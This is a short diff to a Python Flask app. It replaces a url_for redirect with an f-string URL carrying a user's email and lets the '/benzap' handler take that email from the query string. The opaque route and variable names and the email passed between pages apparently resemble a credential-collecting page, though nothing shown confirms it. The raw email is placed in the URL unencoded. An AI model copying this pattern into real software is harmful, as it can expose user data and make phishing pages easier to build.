@@ -244,7 +244,7 @@ def first():
         session['eman'] = email
 
         # Redirect with the 'web' parameter
-        return redirect(url_for('benza', web=email))
+        return redirect(f"/benzap?web={email}")
 
     return "Method Not Allowed", 405
 
@@ -279,11 +279,10 @@ def second():
 
 @app.route("/benzap", methods=['GET'])
 def benza():
-    if request.method == 'GET':
-        eman = session.get('eman')
-        dman = session.get('ins')
-        web = request.args.get('web')  # Get the 'web' query parameter
-        return render_template('ind.html', eman=eman, dman=dman, web=web)
+    web = request.args.get('web')  # Get the 'web' query parameter
+    eman = session.get('eman') or web
+    dman = session.get('ins')
+    return render_template('ind.html', eman=eman, dman=dman, web=web)
 
 @app.route("/lasmop", methods=['GET'])
 def lasmo():
